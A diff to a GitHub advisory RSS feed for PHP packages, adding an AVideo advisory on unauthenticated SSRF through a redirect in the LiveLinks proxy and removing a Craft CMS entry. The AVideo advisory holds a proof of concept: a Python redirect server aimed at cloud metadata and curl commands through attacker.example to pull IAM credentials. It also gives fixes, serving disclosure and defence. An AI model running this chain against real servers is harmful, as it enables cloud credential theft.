@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/composer.rss</id>
     <title>Security Advisory for PHP packages hosted at packagist.org</title>
-    <updated>2026-03-17T20:08:04.076Z</updated>
+    <updated>2026-03-17T21:09:23.866Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
     <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
@@ -11,6 +11,150 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[wwbn/avideo] AVideo vulnerable to unauthenticated SSRF via HTTP redirect bypass in LiveLinks proxy]]></title>
+        <id>https://github.com/advisories/GHSA-9x67-f2v7-63rw</id>
+        <link href="https://github.com/advisories/GHSA-9x67-f2v7-63rw"/>
+        <updated>2026-03-17T20:33:07.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The <code>plugin/LiveLinks/proxy.php</code> endpoint validates user-supplied URLs against internal/private networks using <code>isSSRFSafeURL()</code>, but only checks the initial URL. When the initial URL responds with an HTTP redirect (<code>Location</code> header), the redirect target is fetched via <code>fakeBrowser()</code> without re-validation, allowing an attacker to reach internal services (cloud metadata, RFC1918 addresses) through an attacker-controlled redirect.</p>
+<h2 id="affected-component">Affected Component</h2>
+<ul>
+<li><code>plugin/LiveLinks/proxy.php</code> — lines 38-42 (redirect handling without SSRF re-validation)</li>
+<li><code>objects/functionsBrowser.php</code> — <code>fakeBrowser()</code> (line 123, raw cURL fetch with no SSRF protections)</li>
+</ul>
+<h2 id="description">Description</h2>
+<h3 id="missing-ssrf-re-validation-after-http-redirect">Missing SSRF re-validation after HTTP redirect</h3>
+<p>The <code>proxy.php</code> endpoint validates the user-supplied <code>livelink</code> parameter against internal networks on line 18, using the comprehensive <code>isSSRFSafeURL()</code> function (which blocks private IPs, loopback, link-local/metadata, cloud metadata hostnames, and resolves DNS to detect rebinding). However, after calling <code>get_headers()</code> on line 38 — which follows HTTP redirects — the code extracts the <code>Location</code> header and passes it directly to <code>fakeBrowser()</code> without re-applying the SSRF check:</p>
+<pre><code class="language-php">// plugin/LiveLinks/proxy.php — lines 17-42
+
+// SSRF Protection: Block requests to internal/private networks
+if (!isSSRFSafeURL($_GET['livelink'])) {                    // line 18: only checks initial URL
+    _error_log("LiveLinks proxy: SSRF protection blocked URL: " . $_GET['livelink']);
+    echo "Access denied: URL targets restricted network";
+    exit;
+}
+
+// ... stream context setup ...
+
+$headers = get_headers($_GET['livelink'], 1, $context);      // line 38: follows redirects
+if (!empty($headers["Location"])) {
+    $_GET['livelink'] = $headers["Location"];                 // line 40: attacker-controlled redirect target
+    $urlinfo = parse_url($_GET['livelink']);
+    $content = fakeBrowser($_GET['livelink']);                 // line 42: fetches internal URL, NO SSRF check
+    $_GET['livelink'] = "{$urlinfo["scheme"]}://{$urlinfo["host"]}:{$urlinfo["port"]}";
+}
+</code></pre>
+<h3 id="no-ssrf-protections-in-fakebrowser">No SSRF protections in fakeBrowser()</h3>
+<p>The <code>fakeBrowser()</code> function in <code>objects/functionsBrowser.php</code> performs a raw cURL GET with no URL validation:</p>
+<pre><code class="language-php">// objects/functionsBrowser.php — lines 123-141
+function fakeBrowser($url)
+{
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 ...');
+    $output = curl_exec($ch);
+    curl_close($ch);
+    return $output;
+}
+</code></pre>
+<p>No IP validation, no scheme restriction, no redirect control — any URL passed to this function is fetched unconditionally.</p>
+<h3 id="endpoint-is-fully-unauthenticated">Endpoint is fully unauthenticated</h3>
+<p>The file begins by explicitly opting out of database and session initialization:</p>
+<pre><code class="language-php">$doNotConnectDatabaseIncludeConfig = 1;
+$doNotStartSessionbaseIncludeConfig = 1;
+require_once '../../videos/configuration.php';
+</code></pre>
+<p>There is no <code>.htaccess</code> rule restricting access to <code>proxy.php</code>, and the root <code>.htaccess</code> confirms the plugin directory is routable (line 248: <code>RewriteRule ^plugin/([^...]+)/(.*)?$ plugin/$1/$2</code>).</p>
+<h3 id="inconsistent-defense-pattern">Inconsistent defense pattern</h3>
+<p>The codebase demonstrates awareness of SSRF risks — <code>isSSRFSafeURL()</code> is used in 5 other locations (<code>aVideoEncoder.json.php:303</code>, <code>aVideoEncoderReceiveImage.json.php:67,107,135,160</code>, <code>AI/receiveAsync.json.php:177</code>). However, none of these callers deal with HTTP redirects. The <code>proxy.php</code> endpoint is the only one that follows redirects, and it is the only one that fails to re-validate after following them.</p>
+<h3 id="double-ssrf-exposure">Double SSRF exposure</h3>
+<p>There are actually two SSRF requests in the redirect path:</p>
+<ol>
+<li><code>get_headers()</code> (line 38) follows the redirect to the internal IP to fetch response headers</li>
+<li><code>fakeBrowser()</code> (line 42) fetches the full response body from the internal IP</li>
+</ol>
+<p>The second is more impactful as it returns the full content to the attacker.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p><strong>Step 1:</strong> Set up an attacker-controlled server that returns a 302 redirect to an internal target:</p>
+<pre><code class="language-python"># redirect_server.py
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+class RedirectHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(302)
+        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/')
+        self.end_headers()
+
+HTTPServer(('0.0.0.0', 8080), RedirectHandler).serve_forever()
+</code></pre>
+<p><strong>Step 2:</strong> Send the request to the target AVideo instance:</p>
+<pre><code class="language-bash">curl -s "https://TARGET/plugin/LiveLinks/proxy.php?livelink=https://attacker.example:8080/redirect"
+</code></pre>
+<p><strong>Expected result:</strong> The response will contain the cloud metadata listing (e.g., <code>ami-id</code>, <code>instance-id</code>, <code>iam/</code>) prefixed with <code>http://169.254.169.254:</code> on each line. The attacker strips the prefix to recover the original metadata content.</p>
+<p><strong>Step 3:</strong> Escalate to IAM credential theft:</p>
+<pre><code class="language-bash"># Redirect to: http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role-name&gt;
+curl -s "https://TARGET/plugin/LiveLinks/proxy.php?livelink=https://attacker.example:8080/redirect-iam"
+</code></pre>
+<p>This returns temporary AWS credentials (<code>AccessKeyId</code>, <code>SecretAccessKey</code>, <code>Token</code>) that can be used to access cloud resources.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Cloud metadata exposure:</strong> Attacker can read instance metadata on AWS (169.254.169.254), GCP (metadata.google.internal), and Azure (169.254.169.254) cloud deployments, including IAM role credentials</li>
+<li><strong>Internal network scanning:</strong> Attacker can probe RFC1918 addresses (10.x, 172.16-31.x, 192.168.x) and localhost services to map internal infrastructure</li>
+<li><strong>Internal service data exfiltration:</strong> Any HTTP GET-accessible internal service (databases with HTTP interfaces, admin panels, monitoring dashboards) can have its content read and returned to the attacker</li>
+<li><strong>No authentication required:</strong> The attack is fully unauthenticated, requiring only network access to the AVideo instance</li>
+</ul>
+<h2 id="recommended-remediation">Recommended Remediation</h2>
+<h3 id="option-1-re-validate-the-redirect-target-with-isssrfsafeurl-preferred">Option 1: Re-validate the redirect target with isSSRFSafeURL() (preferred)</h3>
+<p>Apply the same SSRF check to the redirect URL before fetching it:</p>
+<pre><code class="language-php">$headers = get_headers($_GET['livelink'], 1, $context);
+if (!empty($headers["Location"])) {
+    $_GET['livelink'] = $headers["Location"];
+
+    // Re-validate redirect target against SSRF
+    if (!isSSRFSafeURL($_GET['livelink'])) {
+        _error_log("LiveLinks proxy: SSRF protection blocked redirect URL: " . $_GET['livelink']);
+        echo "Access denied: Redirect URL targets restricted network";
+        exit;
+    }
+
+    $urlinfo = parse_url($_GET['livelink']);
+    $content = fakeBrowser($_GET['livelink']);
+    $_GET['livelink'] = "{$urlinfo["scheme"]}://{$urlinfo["host"]}:{$urlinfo["port"]}";
+}
+</code></pre>
+<h3 id="option-2-disable-redirect-following-in-get_headers">Option 2: Disable redirect following in get_headers()</h3>
+<p>Prevent <code>get_headers()</code> from following redirects entirely by adding <code>follow_location</code> to the stream context:</p>
+<pre><code class="language-php">$options = array(
+    'http' =&gt; array(
+        'user_agent' =&gt; '...',
+        'method' =&gt; 'GET',
+        'header' =&gt; array("Referer: localhost\r\nAccept-language: en\r\nCookie: foo=bar\r\n"),
+        'follow_location' =&gt; 0,  // Do not follow redirects
+        'max_redirects' =&gt; 0,
+    )
+);
+</code></pre>
+<p>Then validate the <code>Location</code> header with <code>isSSRFSafeURL()</code> before following it manually. This approach prevents the <code>get_headers()</code> call itself from performing SSRF via the redirect.</p>
+<p><strong>Note:</strong> Option 1 is simpler but still allows <code>get_headers()</code> to make an initial request to the redirect target (header-only SSRF). Option 2 eliminates both SSRF vectors. Both options should be combined for defense-in-depth.</p>
+<h2 id="credit">Credit</h2>
+<p>This vulnerability was discovered and reported by <a href="https://bugbunny.ai">bugbunny.ai</a>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/WWBN/AVideo/security/advisories/GHSA-9x67-f2v7-63rw">https://github.com/WWBN/AVideo/security/advisories/GHSA-9x67-f2v7-63rw</a></li>
+<li><a href="https://github.com/WWBN/AVideo/commit/0e56382921fc71e64829cd1ec35f04e338c70917">https://github.com/WWBN/AVideo/commit/0e56382921fc71e64829cd1ec35f04e338c70917</a></li>
+<li><a href="https://github.com/advisories/GHSA-9x67-f2v7-63rw">https://github.com/advisories/GHSA-9x67-f2v7-63rw</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9x67-f2v7-63rw</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-17T20:33:06.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[aureuserp/aureuserp] Aureus ERP vulnerable to cross-site scripting in the Chatter Message Handler]]></title>
         <id>https://github.com/advisories/GHSA-76c2-3q6g-xvpm</id>
@@ -1635,32 +1779,5 @@ if (!isset($file-&gt;error)) {
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-03-16T18:13:33.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[craftcms/cms] Craft CMS vulnerable to behavior injection RCE ElementIndexesController and FieldsController]]></title>
-        <id>https://github.com/advisories/GHSA-4484-8v2f-5748</id>
-        <link href="https://github.com/advisories/GHSA-4484-8v2f-5748"/>
-        <updated>2026-03-16T21:57:51.000Z</updated>
-        <content type="html"><![CDATA[<p>The fix for <a href="https://github.com/advisories/GHSA-7jx7-3846-m7w7">https://github.com/advisories/GHSA-7jx7-3846-m7w7</a> (commit <a href="https://github.com/craftcms/cms/commit/395c64f0b80b507be1c862a2ec942eaacb353748">https://github.com/craftcms/cms/commit/395c64f0b80b507be1c862a2ec942eaacb353748</a>) only patched <code>src/services/Fields.php</code>, but the same vulnerable pattern exists in <code>ElementIndexesController</code> and <code>FieldsController</code>.</p>
-<p>You need Craft control panel administrator permissions, and allowAdminChanges must be enabled for this to work.</p>
-<p>An attacker can use the same gadget chain from the original advisory to achieve RCE.</p>
-<p>Users should update to Craft 4.17.5 and 5.9.11 to mitigate the issue.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-4484-8v2f-5748">https://github.com/craftcms/cms/security/advisories/GHSA-4484-8v2f-5748</a></li>
-<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-7jx7-3846-m7w7">https://github.com/craftcms/cms/security/advisories/GHSA-7jx7-3846-m7w7</a></li>
-<li><a href="https://github.com/craftcms/cms/commit/78d181e12e0b15e1300f54ec85f19859d3300f70">https://github.com/craftcms/cms/commit/78d181e12e0b15e1300f54ec85f19859d3300f70</a></li>
-<li><a href="https://github.com/craftcms/cms/commit/dfec46362fcb40b330ce8a4d8136446e65085620">https://github.com/craftcms/cms/commit/dfec46362fcb40b330ce8a4d8136446e65085620</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32264">https://nvd.nist.gov/vuln/detail/CVE-2026-32264</a></li>
-<li><a href="https://github.com/advisories/GHSA-4484-8v2f-5748">https://github.com/advisories/GHSA-4484-8v2f-5748</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4484-8v2f-5748</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-16T18:13:15.000Z</published>
     </entry>
 </feed>
